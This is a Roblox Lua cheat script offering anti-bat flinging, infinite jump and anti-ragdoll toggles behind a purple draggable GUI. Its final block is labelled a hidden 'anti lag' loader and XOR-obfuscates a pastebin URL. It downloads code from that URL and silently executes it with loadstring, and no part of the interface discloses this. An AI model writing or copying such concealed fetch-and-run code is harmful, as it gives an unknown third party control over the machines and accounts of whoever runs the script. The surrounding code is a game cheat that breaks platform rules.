
repeat task.wait() until game:IsLoaded()
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local CONFIG_FILE = "Calse_AntiBat_Config.json"
local AntiBatEnabled = false
local InfiniteJumpEnabled = false
local InfiniteJumpHoldEnabled = false
local IsJumpingHold = false
local CurrentKeybind = Enum.KeyCode.N
local WaitingForKeybind = false
local isMobileMode = true
local CurrentBG = "rbxassetid://95360554786881"
local AntiBatConn = nil
local AntiRagdollConn = nil
local JumpHoldConn = nil

-- ===================== PURPLE THEME =====================
local PURPLE = Color3.fromRGB(145, 70, 255)
local PURPLE_DARK = Color3.fromRGB(75, 30, 140)
local PURPLE_LIGHT = Color3.fromRGB(190, 130, 255)
local PURPLE_BG = Color3.fromRGB(20, 10, 30)
local PURPLE_PANEL = Color3.fromRGB(40, 18, 55)
local WHITE = Color3.fromRGB(240, 240, 240)

local function saveConfig()
	local data = {
		Keybind = CurrentKeybind.Name,
		Background = CurrentBG,
		MobileMode = isMobileMode
	}
	pcall(function()
		writefile(CONFIG_FILE, HttpService:JSONEncode(data))
	end)
end

local function loadConfig()
	local success, result = pcall(function()
		if isfile(CONFIG_FILE) then
			return HttpService:JSONDecode(readfile(CONFIG_FILE))
		end
	end)
	if success and result then
		if result.Keybind and Enum.KeyCode[result.Keybind] then
			CurrentKeybind = Enum.KeyCode[result.Keybind]
		end
		if result.Background then
			CurrentBG = result.Background
		end
		if result.MobileMode ~= nil then
			isMobileMode = result.MobileMode
		end
	end
end

loadConfig()

local function startAntiBat()
	local char = LocalPlayer.Character
	if not char then return end
	local root = char:FindFirstChild("HumanoidRootPart")
	if not root then return end
	if AntiBatConn then AntiBatConn:Disconnect() end
	AntiBatConn = RunService.Heartbeat:Connect(function()
		if not root or not root.Parent then return end
		local origXZ = Vector3.new(root.Velocity.X, 0, root.Velocity.Z)
		root.Velocity = Vector3.new(1000, root.Velocity.Y, 1000)
		RunService.RenderStepped:Wait()
		root.Velocity = Vector3.new(origXZ.X, root.Velocity.Y, origXZ.Z)
	end)
end

local function stopAntiBat()
	if AntiBatConn then
		AntiBatConn:Disconnect()
		AntiBatConn = nil
	end
end

local function startJumpHoldLoop()
	if JumpHoldConn then JumpHoldConn:Disconnect() end
	JumpHoldConn = RunService.Heartbeat:Connect(function()
		if not InfiniteJumpHoldEnabled or not IsJumpingHold then return end
		local char = LocalPlayer.Character
		if not char then return end
		local root = char:FindFirstChild("HumanoidRootPart")
		if root then
			root.Velocity = Vector3.new(root.Velocity.X, 55, root.Velocity.Z)
		end
	end)
end

-- Only keyboard Space controls the hold-jump state.
-- Mobile touches are NOT treated as jump input, so tapping anywhere
-- on the screen will no longer make the character jump.
UserInputService.InputBegan:Connect(function(input, gp)
	if gp then return end
	if input.KeyCode == Enum.KeyCode.Space then
		IsJumpingHold = true
	end
end)

UserInputService.InputEnded:Connect(function(input)
	if input.KeyCode == Enum.KeyCode.Space then
		IsJumpingHold = false
	end
end)

UserInputService.JumpRequest:Connect(function()
	if not InfiniteJumpEnabled then return end
	local char = LocalPlayer.Character
	if not char then return end
	local root = char:FindFirstChild("HumanoidRootPart")
	if root then
		root.Velocity = Vector3.new(root.Velocity.X, 55, root.Velocity.Z)
	end
end)

local function startAntiRagdoll()
	if AntiRagdollConn then return end
	AntiRagdollConn = RunService.Heartbeat:Connect(function()
		local char = LocalPlayer.Character
		if not char then return end
		local hum2 = char:FindFirstChildOfClass("Humanoid")
		local root = char:FindFirstChild("HumanoidRootPart")
		if hum2 then
			local st = hum2:GetState()
			if st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll or st == Enum.HumanoidStateType.FallingDown then
				hum2:ChangeState(Enum.HumanoidStateType.Running)
				workspace.CurrentCamera.CameraSubject = hum2
				pcall(function()
					local pm = LocalPlayer.PlayerScripts:FindFirstChild("PlayerModule")
					if pm then require(pm:FindFirstChild("ControlModule")):Enable() end
				end)
				if root then
					root.Velocity = Vector3.new(0, 0, 0)
					root.RotVelocity = Vector3.new(0, 0, 0)
				end
			end
		end
		for _, obj in ipairs(char:GetDescendants()) do
			if obj:IsA("Motor6D") and not obj.Enabled then
				obj.Enabled = true
			end
		end
	end)
end

LocalPlayer.CharacterAdded:Connect(function()
	task.wait(0.3)
	if AntiBatEnabled then startAntiBat() end
	task.wait(0.5)
	startAntiRagdoll()
end)

local Calse_anti_bat = Instance.new("ScreenGui")
Calse_anti_bat.Name = "Calse anti bat"
Calse_anti_bat.ResetOnSpawn = false
Calse_anti_bat.DisplayOrder = 10
Calse_anti_bat.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Calse_anti_bat.Parent = LocalPlayer:WaitForChild("PlayerGui")

local Main = Instance.new("Frame")
Main.Name = "Main"
Main.Active = true
Main.ClipsDescendants = true
Main.Position = UDim2.new(0.5, -115, 0.5, -72)
Main.Size = UDim2.new(0, 230, 0, 145)
Main.BackgroundColor3 = PURPLE_BG
Main.BorderSizePixel = 0
Main.Parent = Calse_anti_bat

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = Main

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = PURPLE
UIStroke.Thickness = 1.5
UIStroke.Transparency = 0.15
UIStroke.Parent = Main

local SpaceBackground = Instance.new("ImageLabel")
SpaceBackground.Name = "SpaceBackground"
SpaceBackground.ZIndex = 0
SpaceBackground.Size = UDim2.new(1, 0, 1, 0)
SpaceBackground.BackgroundTransparency = 1
SpaceBackground.Image = CurrentBG
SpaceBackground.ScaleType = Enum.ScaleType.Crop
SpaceBackground.Parent = Main

local UICorner2 = Instance.new("UICorner")
UICorner2.CornerRadius = UDim.new(0, 12)
UICorner2.Parent = SpaceBackground

local Header = Instance.new("Frame")
Header.Name = "Header"
Header.Active = true
Header.ZIndex = 2
Header.Size = UDim2.new(1, 0, 0, 40)
Header.BackgroundTransparency = 1
Header.Parent = Main

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(1, 0, 1, 0)
Frame.BackgroundColor3 = PURPLE_PANEL
Frame.BackgroundTransparency = 0.25
Frame.BorderSizePixel = 0
Frame.Parent = Header

local UICorner4 = Instance.new("UICorner")
UICorner4.CornerRadius = UDim.new(0, 12)
UICorner4.Parent = Frame

local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.ZIndex = 3
Title.Position = UDim2.new(0, 10, 0, 0)
Title.Size = UDim2.new(1, -100, 1, 0)
Title.BackgroundTransparency = 1
Title.Text = "Calse ANTI BAT"
Title.TextColor3 = WHITE
Title.TextSize = 11
Title.TextScaled = true
Title.Font = Enum.Font.LuckiestGuy
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.TextWrapped = true
Title.Parent = Header

local UIStroke2 = Instance.new("UIStroke")
UIStroke2.Color = PURPLE
UIStroke2.Thickness = 1.2
UIStroke2.Parent = Title

local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
UITextSizeConstraint.MinTextSize = 8
UITextSizeConstraint.MaxTextSize = 11
UITextSizeConstraint.Parent = Title

local ModeToggle = Instance.new("TextButton")
ModeToggle.Name = "ModeToggle"
ModeToggle.ZIndex = 4
ModeToggle.AnchorPoint = Vector2.new(1, 0.5)
ModeToggle.Position = UDim2.new(1, -8, 0.5, 0)
ModeToggle.Size = UDim2.new(0, 42, 0, 18)
ModeToggle.BackgroundColor3 = PURPLE_DARK
ModeToggle.BackgroundTransparency = 0.15
ModeToggle.Text = isMobileMode and "PC" or "MOBILE"
ModeToggle.TextColor3 = WHITE
ModeToggle.TextSize = 7
ModeToggle.Font = Enum.Font.GothamBold
ModeToggle.Parent = Header

local UICorner5 = Instance.new("UICorner")
UICorner5.CornerRadius = UDim.new(0, 6)
UICorner5.Parent = ModeToggle

local UIStroke3 = Instance.new("UIStroke")
UIStroke3.Color = PURPLE
UIStroke3.Transparency = 0.05
UIStroke3.Parent = ModeToggle

local BackgroundButton = Instance.new("TextButton")
BackgroundButton.Name = "BackgroundButton"
BackgroundButton.ZIndex = 13
BackgroundButton.AnchorPoint = Vector2.new(1, 0.5)
BackgroundButton.Position = UDim2.new(1, -54, 0.5, 0)
BackgroundButton.Size = UDim2.new(0, 42, 0, 18)
BackgroundButton.BackgroundColor3 = PURPLE_DARK
BackgroundButton.BackgroundTransparency = 0.05
BackgroundButton.Text = "BG"
BackgroundButton.TextColor3 = WHITE
BackgroundButton.TextSize = 10
BackgroundButton.Font = Enum.Font.GothamBold
BackgroundButton.AutoButtonColor = false
BackgroundButton.Parent = Header

local UICorner6 = Instance.new("UICorner")
UICorner6.CornerRadius = UDim.new(0, 6)
UICorner6.Parent = BackgroundButton

local UIStroke4 = Instance.new("UIStroke")
UIStroke4.Color = PURPLE
UIStroke4.Transparency = 0.05
UIStroke4.Parent = BackgroundButton

local ContentHolder = Instance.new("Frame")
ContentHolder.Name = "ContentHolder"
ContentHolder.ZIndex = 2
ContentHolder.ClipsDescendants = true
ContentHolder.Position = UDim2.new(0, 10, 0, 42)
ContentHolder.Size = UDim2.new(1, -20, 1, -52)
ContentHolder.BackgroundTransparency = 1
ContentHolder.Parent = Main

local Content = Instance.new("Frame")
Content.Name = "Content"
Content.ZIndex = 2
Content.Size = UDim2.new(1, 0, 1, 0)
Content.BackgroundTransparency = 1
Content.Parent = ContentHolder

local PCContent = Instance.new("Frame")
PCContent.Name = "PCContent"
PCContent.Size = UDim2.new(1, 0, 1, 0)
PCContent.BackgroundTransparency = 1
PCContent.Visible = not isMobileMode
PCContent.Parent = Content

local Frame2 = Instance.new("Frame")
Frame2.ZIndex = 3
Frame2.Size = UDim2.new(1, 0, 0, 32)
Frame2.BackgroundColor3 = PURPLE_PANEL
Frame2.BackgroundTransparency = 0.15
Frame2.BorderSizePixel = 0
Frame2.Parent = PCContent

local UICorner7 = Instance.new("UICorner")
UICorner7.Parent = Frame2

local UIStroke5 = Instance.new("UIStroke")
UIStroke5.Color = PURPLE
UIStroke5.Transparency = 0.15
UIStroke5.Parent = Frame2

local TextLabel = Instance.new("TextLabel")
TextLabel.ZIndex = 4
TextLabel.Position = UDim2.new(0, 10, 0, 0)
TextLabel.Size = UDim2.new(0, 60, 1, 0)
TextLabel.BackgroundTransparency = 1
TextLabel.Text = "Anti-Bat"
TextLabel.TextColor3 = WHITE
TextLabel.TextSize = 12
TextLabel.Font = Enum.Font.GothamBold
TextLabel.TextXAlignment = Enum.TextXAlignment.Left
TextLabel.Parent = Frame2

local KeybindBtn = Instance.new("TextButton")
KeybindBtn.ZIndex = 10
KeybindBtn.AnchorPoint = Vector2.new(0, 0.5)
KeybindBtn.Position = UDim2.new(0, 74, 0.5, 0)
KeybindBtn.Size = UDim2.new(0, 32, 0, 16)
KeybindBtn.BackgroundColor3 = PURPLE_DARK
KeybindBtn.BackgroundTransparency = 0.05
KeybindBtn.Text = CurrentKeybind.Name
KeybindBtn.TextColor3 = WHITE
KeybindBtn.Font = Enum.Font.GothamBold
KeybindBtn.Parent = Frame2

local UICorner8 = Instance.new("UICorner")
UICorner8.CornerRadius = UDim.new(0, 5)
UICorner8.Parent = KeybindBtn

local UIStroke6 = Instance.new("UIStroke")
UIStroke6.Color = PURPLE
UIStroke6.Transparency = 0.05
UIStroke6.Parent = KeybindBtn

local AntiBatToggleBg = Instance.new("Frame")
AntiBatToggleBg.ZIndex = 4
AntiBatToggleBg.AnchorPoint = Vector2.new(1, 0.5)
AntiBatToggleBg.Position = UDim2.new(1, -10, 0.5, 0)
AntiBatToggleBg.Size = UDim2.new(0, 32, 0, 15)
AntiBatToggleBg.BackgroundColor3 = PURPLE_DARK
AntiBatToggleBg.BorderSizePixel = 0
AntiBatToggleBg.Parent = Frame2

local UICorner9 = Instance.new("UICorner")
UICorner9.CornerRadius = UDim.new(1, 0)
UICorner9.Parent = AntiBatToggleBg

local UIStroke7 = Instance.new("UIStroke")
UIStroke7.Color = PURPLE
UIStroke7.Transparency = 0.05
UIStroke7.Parent = AntiBatToggleBg

local AntiBatKnob = Instance.new("Frame")
AntiBatKnob.ZIndex = 5
AntiBatKnob.AnchorPoint = Vector2.new(0, 0.5)
AntiBatKnob.Position = UDim2.new(0, 3, 0.5, 0)
AntiBatKnob.Size = UDim2.new(0, 11, 0, 11)
AntiBatKnob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AntiBatKnob.BorderSizePixel = 0
AntiBatKnob.Parent = AntiBatToggleBg

local UICorner10 = Instance.new("UICorner")
UICorner10.CornerRadius = UDim.new(1, 0)
UICorner10.Parent = AntiBatKnob

local AntiBatClick = Instance.new("TextButton")
AntiBatClick.ZIndex = 6
AntiBatClick.Size = UDim2.new(1, 0, 1, 0)
AntiBatClick.BackgroundTransparency = 1
AntiBatClick.Text = ""
AntiBatClick.Parent = Frame2

local Frame5 = Instance.new("Frame")
Frame5.ZIndex = 3
Frame5.Position = UDim2.new(0, 0, 0, 36)
Frame5.Size = UDim2.new(1, 0, 0, 32)
Frame5.BackgroundColor3 = PURPLE_PANEL
Frame5.BackgroundTransparency = 0.2
Frame5.BorderSizePixel = 0
Frame5.Parent = PCContent

local UICorner12 = Instance.new("UICorner")
UICorner12.Parent = Frame5

local UIStroke9 = Instance.new("UIStroke")
UIStroke9.Color = PURPLE
UIStroke9.Transparency = 0.15
UIStroke9.Parent = Frame5

local TextLabel2 = Instance.new("TextLabel")
TextLabel2.ZIndex = 4
TextLabel2.Position = UDim2.new(0, 10, 0, 0)
TextLabel2.Size = UDim2.new(0, 60, 1, 0)
TextLabel2.BackgroundTransparency = 1
TextLabel2.Text = "Inf Jump"
TextLabel2.TextColor3 = WHITE
TextLabel2.TextSize = 12
TextLabel2.Font = Enum.Font.GothamBold
TextLabel2.TextXAlignment = Enum.TextXAlignment.Left
TextLabel2.Parent = Frame5

local InfJumpToggleBg = Instance.new("Frame")
InfJumpToggleBg.ZIndex = 4
InfJumpToggleBg.AnchorPoint = Vector2.new(1, 0.5)
InfJumpToggleBg.Position = UDim2.new(1, -10, 0.5, 0)
InfJumpToggleBg.Size = UDim2.new(0, 32, 0, 15)
InfJumpToggleBg.BackgroundColor3 = PURPLE_DARK
InfJumpToggleBg.BorderSizePixel = 0
InfJumpToggleBg.Parent = Frame5

local UICorner13 = Instance.new("UICorner")
UICorner13.CornerRadius = UDim.new(1, 0)
UICorner13.Parent = InfJumpToggleBg

local UIStroke10 = Instance.new("UIStroke")
UIStroke10.Color = PURPLE
UIStroke10.Transparency = 0.05
UIStroke10.Parent = InfJumpToggleBg

local InfJumpKnob = Instance.new("Frame")
InfJumpKnob.ZIndex = 5
InfJumpKnob.AnchorPoint = Vector2.new(0, 0.5)
InfJumpKnob.Position = UDim2.new(0, 3, 0.5, 0)
InfJumpKnob.Size = UDim2.new(0, 11, 0, 11)
InfJumpKnob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InfJumpKnob.BorderSizePixel = 0
InfJumpKnob.Parent = InfJumpToggleBg

local UICorner14 = Instance.new("UICorner")
UICorner14.CornerRadius = UDim.new(1, 0)
UICorner14.Parent = InfJumpKnob

local InfJumpClick = Instance.new("TextButton")
InfJumpClick.ZIndex = 6
InfJumpClick.Size = UDim2.new(1, 0, 1, 0)
InfJumpClick.BackgroundTransparency = 1
InfJumpClick.Text = ""
InfJumpClick.Parent = Frame5

local MobileContent = Instance.new("Frame")
MobileContent.Name = "MobileContent"
MobileContent.Size = UDim2.new(1, 0, 1, 0)
MobileContent.BackgroundTransparency = 1
MobileContent.Visible = isMobileMode
MobileContent.Parent = Content

local MobileAntiBatBtn = Instance.new("TextButton")
MobileAntiBatBtn.ZIndex = 3
MobileAntiBatBtn.Size = UDim2.new(1, 0, 0, 32)
MobileAntiBatBtn.BackgroundColor3 = PURPLE_DARK
MobileAntiBatBtn.BackgroundTransparency = 0.05
MobileAntiBatBtn.Text = "ANTI-BAT"
MobileAntiBatBtn.TextColor3 = WHITE
MobileAntiBatBtn.TextSize = 13
MobileAntiBatBtn.Font = Enum.Font.GothamBold
MobileAntiBatBtn.AutoButtonColor = false
MobileAntiBatBtn.Parent = MobileContent

local UICornerM1 = Instance.new("UICorner")
UICornerM1.CornerRadius = UDim.new(0, 8)
UICornerM1.Parent = MobileAntiBatBtn

local UIStrokeM1 = Instance.new("UIStroke")
UIStrokeM1.Color = PURPLE
UIStrokeM1.Transparency = 0.1
UIStrokeM1.Parent = MobileAntiBatBtn

local MobileInfJumpBtn = Instance.new("TextButton")
MobileInfJumpBtn.ZIndex = 3
MobileInfJumpBtn.Position = UDim2.new(0, 0, 0, 38)
MobileInfJumpBtn.Size = UDim2.new(1, 0, 0, 32)
MobileInfJumpBtn.BackgroundColor3 = PURPLE_DARK
MobileInfJumpBtn.BackgroundTransparency = 0.05
MobileInfJumpBtn.Text = "INF JUMP"
MobileInfJumpBtn.TextColor3 = WHITE
MobileInfJumpBtn.TextSize = 13
MobileInfJumpBtn.Font = Enum.Font.GothamBold
MobileInfJumpBtn.AutoButtonColor = false
MobileInfJumpBtn.Parent = MobileContent

local UICornerM2 = Instance.new("UICorner")
UICornerM2.CornerRadius = UDim.new(0, 8)
UICornerM2.Parent = MobileInfJumpBtn

local UIStrokeM2 = Instance.new("UIStroke")
UIStrokeM2.Color = PURPLE
UIStrokeM2.Transparency = 0.1
UIStrokeM2.Parent = MobileInfJumpBtn

local Footer = Instance.new("TextLabel")
Footer.ZIndex = 3
Footer.Position = UDim2.new(0, 0, 1, -16)
Footer.Size = UDim2.new(1, 0, 0, 16)
Footer.BackgroundTransparency = 1
Footer.Text = "Anti-Bat | Inf Jump | Anti Ragdoll"
Footer.TextColor3 = PURPLE_LIGHT
Footer.Font = Enum.Font.Gotham
Footer.TextSize = 10
Footer.Parent = Content

local BackgroundPicker = Instance.new("Frame")
BackgroundPicker.Name = "BackgroundPicker"
BackgroundPicker.Visible = false
BackgroundPicker.ZIndex = 20
BackgroundPicker.AnchorPoint = Vector2.new(0.5, 0.5)
BackgroundPicker.Position = UDim2.new(0.5, 0, 0.5, 0)
BackgroundPicker.Size = UDim2.new(0, 260, 0, 205)
BackgroundPicker.BackgroundColor3 = PURPLE_BG
BackgroundPicker.BorderSizePixel = 0
BackgroundPicker.Parent = Calse_anti_bat

local UICorner16 = Instance.new("UICorner")
UICorner16.CornerRadius = UDim.new(0, 12)
UICorner16.Parent = BackgroundPicker

local UIStroke12 = Instance.new("UIStroke")
UIStroke12.Color = PURPLE
UIStroke12.Thickness = 1.5
UIStroke12.Transparency = 0.05
UIStroke12.Parent = BackgroundPicker

local Header2 = Instance.new("Frame")
Header2.ZIndex = 21
Header2.Size = UDim2.new(1, 0, 0, 38)
Header2.BackgroundColor3 = PURPLE_PANEL
Header2.BackgroundTransparency = 0.1
Header2.BorderSizePixel = 0
Header2.Parent = BackgroundPicker

local UICorner17 = Instance.new("UICorner")
UICorner17.CornerRadius = UDim.new(0, 12)
UICorner17.Parent = Header2

local TextLabel4 = Instance.new("TextLabel")
TextLabel4.ZIndex = 22
TextLabel4.Position = UDim2.new(0, 12, 0, 0)
TextLabel4.Size = UDim2.new(1, -54, 1, 0)
TextLabel4.BackgroundTransparency = 1
TextLabel4.Text = "Change Background"
TextLabel4.TextColor3 = WHITE
TextLabel4.TextSize = 16
TextLabel4.Font = Enum.Font.GothamBold
TextLabel4.TextXAlignment = Enum.TextXAlignment.Left
TextLabel4.Parent = Header2

local Close = Instance.new("TextButton")
Close.Name = "Close"
Close.ZIndex = 22
Close.AnchorPoint = Vector2.new(1, 0.5)
Close.Position = UDim2.new(1, -9, 0.5, 0)
Close.Size = UDim2.new(0, 28, 0, 25)
Close.BackgroundColor3 = PURPLE_DARK
Close.BackgroundTransparency = 0.05
Close.Text = "x"
Close.TextColor3 = WHITE
Close.TextSize = 14
Close.Font = Enum.Font.GothamBold
Close.AutoButtonColor = false
Close.Parent = Header2

local UICorner18 = Instance.new("UICorner")
UICorner18.CornerRadius = UDim.new(0, 7)
UICorner18.Parent = Close

local BackgroundGrid = Instance.new("Frame")
BackgroundGrid.ZIndex = 21
BackgroundGrid.Position = UDim2.new(0, 12, 0, 48)
BackgroundGrid.Size = UDim2.new(1, -24, 1, -60)
BackgroundGrid.BackgroundTransparency = 1
BackgroundGrid.Parent = BackgroundPicker

local UIGridLayout = Instance.new("UIGridLayout")
UIGridLayout.CellPadding = UDim2.new(0, 8, 0, 8)
UIGridLayout.CellSize = UDim2.new(0, 72, 0, 72)
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.FillDirectionMaxCells = 3
UIGridLayout.Parent = BackgroundGrid

local bgIds = {
	"rbxassetid://88277668289864",
	"rbxassetid://95360554786881",
	"rbxassetid://137164092894568"
}

for i, id in ipairs(bgIds) do
	local btn = Instance.new("ImageButton")
	btn.ZIndex = 22
	btn.LayoutOrder = i
	btn.BackgroundColor3 = PURPLE_DARK
	btn.BackgroundTransparency = 0.05
	btn.Image = id
	btn.ScaleType = Enum.ScaleType.Crop
	btn.AutoButtonColor = false
	btn.Parent = BackgroundGrid

	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, 10)
	c.Parent = btn

	local s = Instance.new("UIStroke")
	s.Color = PURPLE
	s.Transparency = 0.05
	s.Parent = btn

	btn.MouseButton1Click:Connect(function()
		CurrentBG = id
		SpaceBackground.Image = id
		BackgroundPicker.Visible = false
		saveConfig()
	end)
end

local function setToggle(knob, bg, enabled)
	TweenService:Create(knob, TweenInfo.new(0.15), {
		Position = enabled and UDim2.new(1, -14, 0.5, 0) or UDim2.new(0, 3, 0.5, 0),
		BackgroundColor3 = enabled and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(255, 255, 255)
	}):Play()

	TweenService:Create(bg, TweenInfo.new(0.15), {
		BackgroundColor3 = enabled and PURPLE or PURPLE_DARK
	}):Play()
end

local function updateMobileButtons()
	if AntiBatEnabled then
		MobileAntiBatBtn.BackgroundColor3 = PURPLE
		MobileAntiBatBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
		UIStrokeM1.Transparency = 0
	else
		MobileAntiBatBtn.BackgroundColor3 = PURPLE_DARK
		MobileAntiBatBtn.TextColor3 = WHITE
		UIStrokeM1.Transparency = 0.2
	end

	if InfiniteJumpEnabled then
		MobileInfJumpBtn.BackgroundColor3 = PURPLE
		MobileInfJumpBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
		UIStrokeM2.Transparency = 0
	else
		MobileInfJumpBtn.BackgroundColor3 = PURPLE_DARK
		MobileInfJumpBtn.TextColor3 = WHITE
		UIStrokeM2.Transparency = 0.2
	end
end

local function switchMode()
	isMobileMode = not isMobileMode
	ModeToggle.Text = isMobileMode and "PC" or "MOBILE"
	PCContent.Visible = not isMobileMode
	MobileContent.Visible = isMobileMode
	saveConfig()
end

AntiBatClick.MouseButton1Click:Connect(function()
	AntiBatEnabled = not AntiBatEnabled
	if AntiBatEnabled then startAntiBat() else stopAntiBat() end
	setToggle(AntiBatKnob, AntiBatToggleBg, AntiBatEnabled)
	updateMobileButtons()
end)

InfJumpClick.MouseButton1Click:Connect(function()
	InfiniteJumpEnabled = not InfiniteJumpEnabled
	InfiniteJumpHoldEnabled = InfiniteJumpEnabled
	if not InfiniteJumpHoldEnabled then IsJumpingHold = false end
	setToggle(InfJumpKnob, InfJumpToggleBg, InfiniteJumpEnabled)
	updateMobileButtons()
end)

MobileAntiBatBtn.MouseButton1Click:Connect(function()
	AntiBatEnabled = not AntiBatEnabled
	if AntiBatEnabled then startAntiBat() else stopAntiBat() end
	setToggle(AntiBatKnob, AntiBatToggleBg, AntiBatEnabled)
	updateMobileButtons()
end)

MobileInfJumpBtn.MouseButton1Click:Connect(function()
	InfiniteJumpEnabled = not InfiniteJumpEnabled
	InfiniteJumpHoldEnabled = InfiniteJumpEnabled
	if not InfiniteJumpHoldEnabled then IsJumpingHold = false end
	setToggle(InfJumpKnob, InfJumpToggleBg, InfiniteJumpEnabled)
	updateMobileButtons()
end)

KeybindBtn.MouseButton1Click:Connect(function()
	if WaitingForKeybind then return end
	WaitingForKeybind = true
	KeybindBtn.Text = "..."
	KeybindBtn.TextColor3 = PURPLE_LIGHT
end)

UserInputService.InputBegan:Connect(function(input, gp)
	if gp then return end
	if WaitingForKeybind then
		if input.UserInputType == Enum.UserInputType.Keyboard then
			CurrentKeybind = input.KeyCode
			WaitingForKeybind = false
			KeybindBtn.Text = CurrentKeybind.Name
			KeybindBtn.TextColor3 = WHITE
			saveConfig()
		end
		return
	end

	if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == CurrentKeybind then
		AntiBatEnabled = not AntiBatEnabled
		if AntiBatEnabled then startAntiBat() else stopAntiBat() end
		setToggle(AntiBatKnob, AntiBatToggleBg, AntiBatEnabled)
		updateMobileButtons()
	end
end)

BackgroundButton.MouseButton1Click:Connect(function()
	BackgroundPicker.Visible = not BackgroundPicker.Visible
end)

Close.MouseButton1Click:Connect(function()
	BackgroundPicker.Visible = false
end)

ModeToggle.MouseButton1Click:Connect(switchMode)

local dragging, dragStart, startPos
Header.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = Main.Position
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
		local delta = input.Position - dragStart
		Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)

UserInputService.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = false
	end
end)

startAntiRagdoll()
startJumpHoldLoop()
setToggle(AntiBatKnob, AntiBatToggleBg, false)
setToggle(InfJumpKnob, InfJumpToggleBg, false)
updateMobileButtons()

-- Hidden anti lag/smooth graphics loader (URL obfuscated)
task.spawn(function()
    local function _xorDecode(s)
        local t = {}
        for i = 1, #s do
            local b = string.byte(s, i)
            local x
            if bit32 and type(bit32.bxor) == "function" then
                x = bit32.bxor(b, 23)
            else
                local r, bit, a, c = 0, 1, b, 23
                while a > 0 or c > 0 do
                    local ab, cb = a % 2, c % 2
                    if ab ~= cb then r = r + bit end
                    a = math.floor(a / 2)
                    c = math.floor(c / 2)
                    bit = bit * 2
                end
                x = r
            end
            t[i] = string.char(x)
        end
        return table.concat(t)
    end
    local ok, src = pcall(function()
        return game:HttpGet(_xorDecode("\127ccgd-88gvdcru~y9txz8ev`8%_\"]nF\\R"))
    end)
    if ok and type(src) == "string" and #src > 50 then
        local fn = loadstring(src)
        if type(fn) == "function" then
            pcall(fn)
        end
    end
end)
